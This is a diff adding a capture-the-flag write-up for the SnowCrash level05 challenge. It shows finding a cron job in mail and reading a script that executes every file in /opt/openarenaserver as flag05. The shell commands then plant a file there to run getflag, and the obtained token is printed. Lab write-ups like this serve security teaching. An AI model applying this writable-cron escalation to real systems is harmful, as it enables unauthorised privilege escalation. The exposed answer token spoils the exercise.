@@ -1,0 +1,36 @@
+When login as level05, "You have a new mail." is printed
+
+Mail are usually stored in /car/mail folder
+
+-----------------------------------------------------------------------------------------------------------------------
+
+level05@SnowCrash:~$ ls /var/mail/
+level05
+
+-----------------------------------------------------------------------------------------------------------------------
+
+level05@SnowCrash:~$ cat /var/mail/level05
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05 --> CRON TASK on every even minutes
+
+-----------------------------------------------------------------------------------------------------------------------
+
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+Execute what's in the /opt/openarenaserver/ folder
+
+-----------------------------------------------------------------------------------------------------------------------
+
+level05@SnowCrash:~$ echo 'getflag > /opt/openarenaserver/flag' > /opt/openarenaserver/innocent_file
+
+-----------------------------------------------------------------------------------------------------------------------
+
+After a little wait (2 minutes at maximum)
+
+level05@SnowCrash:/opt/openarenaserver$ cat /opt/openarenaserver/flag
+Check flag.Here is your token : viuaaale9huek52boumoomioc
